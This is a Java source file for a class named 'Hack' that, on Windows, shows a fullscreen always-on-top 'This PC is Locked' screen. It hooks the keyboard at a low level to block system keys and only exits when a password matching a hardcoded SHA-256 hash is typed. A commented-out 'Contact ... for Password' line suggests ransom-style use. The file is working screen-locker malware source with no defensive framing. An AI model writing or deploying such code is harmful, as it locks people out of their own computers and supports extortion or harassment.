import java.awt.Color;
import java.awt.Font;
import java.awt.Graphics;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.security.NoSuchAlgorithmException;

import javax.swing.JComponent;
import javax.swing.JFrame;

import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef.HMODULE;
import com.sun.jna.platform.win32.WinDef.LRESULT;
import com.sun.jna.platform.win32.WinDef.WPARAM;
import com.sun.jna.platform.win32.WinUser.HHOOK;
import com.sun.jna.platform.win32.WinUser.KBDLLHOOKSTRUCT;
import com.sun.jna.platform.win32.WinUser.LowLevelKeyboardProc;
import com.sun.jna.platform.win32.WinUser.MSG;

final class Hack {

	private static HHOOK hhk;
	private static LowLevelKeyboardProc keyboardHook;
	private static User32 lib;
	private static final String correctPassword = "d3edf2b7031ab38a72b16d55a458a03a586ea5191aa565eea0acc5cff8386351";
	private char[] password;
	private int index;
	private boolean running;

	private Hack(long time) {
		password = new char[10];
		for (int i = 0; i < password.length; i++)
			password[i] = '-';
		index = 0;
		Painter painter = new Painter();
		JFrame frame = new JFrame();
		running = true;
		blockWindowsKey();
		frame.setExtendedState(JFrame.MAXIMIZED_BOTH);
		frame.setUndecorated(true);
		frame.setAlwaysOnTop(true);
		frame.add(painter);
		new Thread(new Runnable() {
			public void run() {
				while (running) {
					try {
						Thread.sleep(20);
					} catch (InterruptedException e) {
					}
					painter.repaint();
				}
			}
		}).start();

		frame.addKeyListener(new KeyAdapter() {
			public void keyPressed(KeyEvent e) {
				if (e.getKeyCode() >= 0x30 && e.getKeyCode() <= 0x5A) {
					if (index < password.length)
						try {
							password[index] = e.getKeyChar();
							index++;
						} catch (Exception e1) {
						}
				}

				if (e.getKeyCode() == 0x08) {
					if (index > 0)
						try {
							index--;
							password[index] = '-';
						} catch (Exception e1) {
						}
					return;
				}

				try {
					if (Hash.toHexString(Hash.getSHA(new String(password))).equals(correctPassword)) {
						frame.setVisible(false);
						unblockWindowsKey();
						System.exit(0);
					}
				} catch (NoSuchAlgorithmException e1) {
				}

			}
		});
		frame.setVisible(true);

		while (time == 0)
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e1) {
				e1.printStackTrace();
			}

		try {
			Thread.sleep(time);
		} catch (InterruptedException e) {
		}
		frame.setVisible(false);
		unblockWindowsKey();
	}

	public static void main(String[] args) {
		new Hack(0);
	}

	private static void blockWindowsKey() {
		if (isWindows()) {
			new Thread(new Runnable() {
				public void run() {
					lib = User32.INSTANCE;
					HMODULE hMod = Kernel32.INSTANCE.GetModuleHandle(null);
					keyboardHook = new LowLevelKeyboardProc() {
						public LRESULT callback(int nCode, WPARAM wParam, KBDLLHOOKSTRUCT info) {
							if (nCode >= 0) {
								if (!isValid(info.vkCode))
									return new LRESULT(1);
							}
							return lib.CallNextHookEx(hhk, nCode, wParam, info.getPointer());
						}
					};
					hhk = lib.SetWindowsHookEx(13, keyboardHook, hMod, 0);

					// This bit never returns from GetMessage
					int result;
					MSG msg = new MSG();
					while ((result = lib.GetMessage(msg, null, 0, 0)) != 0) {
						if (result == -1) {
							break;
						} else {
							lib.TranslateMessage(msg);
							lib.DispatchMessage(msg);
						}
					}
					lib.UnhookWindowsHookEx(hhk);
				}
			}).start();
		}
	}

	private static void unblockWindowsKey() {
		if (isWindows() && lib != null) {
			lib.UnhookWindowsHookEx(hhk);
		}
	}

	private static boolean isWindows() {
		String os = System.getProperty("os.name").toLowerCase();
		return (os.indexOf("win") >= 0);
	}

	private static boolean isValid(int keyCode) {
		if (keyCode >= 0x30 && keyCode <= 0x5A) // number + letter
			return true;
		else
			switch (keyCode) {
			case 0x08: // backspace
			case 0x0D: // enter
			case 0x14: // caps lock
			case 0x20: // space
			case 0xA0: // left shift
			case 0xBA: // ;:
			case 0xBB: // =+
			case 0xBC: // ,<
			case 0xBD: // -_
			case 0xBE: // .>
			case 0xBF: // /?
			case 0xC0: // `~
			case 0xDB: // [{
			case 0xDC: // \|
			case 0xDD: // ]}
			case 0xDE: // '"
				return true;
			default:
				return false;
			}
	}

	private class Painter extends JComponent {

		private static final long serialVersionUID = 1L;

		public void paintComponent(Graphics g) {
			g.setColor(Color.black);
			g.fillRect(0, 0, 10000, 10000);
			g.setColor(Color.white);
			g.setFont(new Font("Consolas", 1, 40));
			g.drawString("This PC is Locked", 780, 480);
//			g.drawString("Contact (---) --- ---- for Password", 580, 550);
			int stringWidth = g.getFontMetrics().stringWidth(new String(password));
			g.drawString(new String(password), 970 - stringWidth / 2, 620);
		}
	}
}
